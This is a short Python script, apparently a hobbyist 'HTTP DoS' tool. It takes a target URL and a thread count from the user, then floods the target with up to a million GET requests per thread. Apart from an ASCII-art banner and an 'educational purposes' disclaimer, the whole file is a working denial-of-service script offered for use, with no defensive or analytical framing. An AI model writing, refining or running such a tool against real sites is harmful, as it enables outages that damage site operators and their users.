import requests, threading, colorama, os

colorama.init()

os.system('cls')
os.system('title RARAS-http-dos-v2')
os.system('cls')

RED = colorama.Fore.LIGHTRED_EX
BLUE = colorama.Fore.LIGHTBLUE_EX
GREEN = colorama.Fore.LIGHTGREEN_EX

# ASCCI FONT IS Nancyj
print(f"""
{RED}
 888888ba                                               dP         dP     dP                              d8888b. 
 88    `8b                                              88         88     88                                  `88 
{GREEN}a88aaaa8P' .d8888b. 88d888b. .d8888b. .d8888b.          88d888b. d8888P d8888P 88d888b.          dP   .dP .aaadP' 
 88   `8b. 88'  `88 88'  `88 88'  `88 Y8ooooo. 88888888 88'  `88   88     88   88'  `88 88888888 88   d8' 88'     
{BLUE} 88     88 88.  .88 88       88.  .88       88          88    88   88     88   88.  .88          88 .88'  88.     
 dP     dP `88888P8 dP       `88888P8 `88888P'          dP    dP   dP     dP   88Y888P'          8888P'   Y88888P 
                                                                               88                                 

{colorama.Fore.LIGHTBLUE_EX}Developer: Creaminit1234
{colorama.Fore.LIGHTGREEN_EX}GITHUB PAGE: github.com/Creaminit1234
{colorama.Fore.LIGHTMAGENTA_EX}>Only for educational purposes<
{colorama.Fore.LIGHTRED_EX}>WARNING ALL THE HTTP REQUESTS ARE MADE WITH YOUR PUBLIC IP!<
""")
print(colorama.Fore.RESET)

targeturl = input(f"{RED}Enter URL:{GREEN} ")
threads = input(f"{BLUE}Enter Number Of Threads:{GREEN} ")
threadsint = int(threads)

def requestmake():
    for i in range(1000000):
        r = requests.get(targeturl)
        r.close()

def thread():
    print(f"{colorama.Fore.LIGHTRED_EX}ATTACKING {targeturl} WITH {threads} THREADS!.")
    for i in range(threadsint):
        tred = threading.Thread(target=requestmake)
        print(f"{colorama.Fore.LIGHTMAGENTA_EX}THREAD {i+1} IS READY", end="\r")
        tred.start()

thread()


#######################################
# FULLY DEVELOPED BY CREAMINIT1234    #
#######################################
